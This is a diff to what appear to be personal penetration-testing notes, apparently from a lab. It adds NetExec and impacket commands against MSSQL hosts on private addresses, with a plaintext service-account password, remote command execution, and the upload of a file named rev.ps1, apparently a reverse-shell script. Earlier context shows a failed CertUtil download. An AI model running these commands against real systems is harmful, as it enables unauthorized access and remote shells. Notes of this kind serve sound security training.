@@ -133,4 +133,28 @@ CertUtil: -URLCache command FAILED: 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIM
 CertUtil: The operation timed out                                                       
 
 NULL    
+
 ```
+
+nxc mssql 
+```
+nxc mssql {{192.168.178.2}} {{[-u|--username]}} {{username}} {{[-p|--password]}} {{password}} -x {{whoami}}
+```
+
+```
+nxc mssql 10.10.10.52 -u svc_sql -p 'SQLPowerHouse333' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file rev.ps1
+ C:\\Windows\\Temp\\rev.ps1
+EX
+
+```
+
+run  impacket-mssqlclient svc_sql:SQLPowerHouse333@172.16.114.202 -windows-auth
+
+Uploaded the file 
+nxc mssql 172.16.114.202 -u svc_sql -p 'SQLPowerHouse333' --put-file rev.ps1 C:\\Users\\Public\\rev.ps1 
+
+![[{9FD091AB-BDBE-44A8-8108-16305998B0AB}.png]]
+
+
